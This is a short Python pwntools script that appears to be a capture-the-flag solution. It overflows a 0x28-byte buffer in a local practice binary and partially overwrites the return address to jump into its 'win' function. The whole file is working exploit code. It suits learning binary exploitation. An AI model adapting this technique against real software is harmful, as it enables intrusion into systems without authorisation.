#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

p = elf.process()
#p = elf.debug(gdbscript="")
#p = remote("127.0.0.1", 9001)

payload = b"A" * 0x28
payload += p8((elf.symbols["win"] + 0x8) & 0xff)

p.send(payload)

p.interactive()
